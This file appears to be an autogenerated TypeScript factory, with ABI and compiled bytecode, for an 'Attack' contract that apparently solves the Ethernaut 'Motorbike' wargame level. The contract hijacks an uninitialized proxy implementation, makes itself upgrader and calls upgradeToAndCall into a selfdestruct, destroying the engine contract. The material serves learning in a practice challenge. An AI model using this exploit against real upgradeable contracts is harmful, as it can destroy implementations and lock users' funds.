/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Attack, AttackInterface } from "../Attack";

const _abi = [
  {
    inputs: [
      {
        internalType: "contract Motorbike",
        name: "_m",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "destruct",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b5060405161064238038061064283398181016040528101906100329190610250565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16638129fc1c6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e057600080fd5b505af11580156100f4573d6000803e3d6000fd5b505050503073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1663af2697456040518163ffffffff1660e01b8152600401602060405180830381865afa15801561015a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061017e91906102bb565b73ffffffffffffffffffffffffffffffffffffffff16146101d4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101cb9061036b565b60405180910390fd5b505061038b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061020b826101e0565b9050919050565b600061021d82610200565b9050919050565b61022d81610212565b811461023857600080fd5b50565b60008151905061024a81610224565b92915050565b600060208284031215610266576102656101db565b5b60006102748482850161023b565b91505092915050565b6000610288826101e0565b9050919050565b6102988161027d565b81146102a357600080fd5b50565b6000815190506102b58161028f565b92915050565b6000602082840312156102d1576102d06101db565b5b60006102df848285016102a6565b91505092915050565b600082825260208201905092915050565b7f656e67696e652075706772616465722068696a61636b696e67206661696c656460008201527f2e00000000000000000000000000000000000000000000000000000000000000602082015250565b60006103556021836102e8565b9150610360826102f9565b604082019050919050565b6000602082019050818103600083015261038481610348565b9050919050565b6102a88061039a6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80632b68b9c61461003b5780639e5faafc14610045575b600080fd5b61004361004f565b005b61004d610068565b005b3273ffffffffffffffffffffffffffffffffffffffff16ff5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16634f1ef28630632b68b9c660e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518363ffffffff1660e01b8152600401610133929190610242565b600060405180830381600087803b15801561014d57600080fd5b505af1158015610161573d6000803e3d6000fd5b5050505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061019382610168565b9050919050565b6101a381610188565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b838110156101e35780820151818401526020810190506101c8565b838111156101f2576000848401525b50505050565b6000601f19601f8301169050919050565b6000610214826101a9565b61021e81856101b4565b935061022e8185602086016101c5565b610237816101f8565b840191505092915050565b6000604082019050610257600083018561019a565b81810360208301526102698184610209565b9050939250505056fea26469706673582212209a5bef3378c1cdb283d56a52562cd922d1a1ff27bbf47a0e4ed6670d4311954664736f6c634300080b0033";

type AttackConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Attack__factory extends ContractFactory {
  constructor(...args: AttackConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "Attack";
  }

  deploy(
    _m: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<Attack> {
    return super.deploy(_m, overrides || {}) as Promise<Attack>;
  }
  getDeployTransaction(
    _m: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_m, overrides || {});
  }
  attach(address: string): Attack {
    return super.attach(address) as Attack;
  }
  connect(signer: Signer): Attack__factory {
    return super.connect(signer) as Attack__factory;
  }
  static readonly contractName: "Attack";
  public readonly contractName: "Attack";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackInterface {
    return new utils.Interface(_abi) as AttackInterface;
  }
  static connect(address: string, signerOrProvider: Signer | Provider): Attack {
    return new Contract(address, _abi, signerOrProvider) as Attack;
  }
}
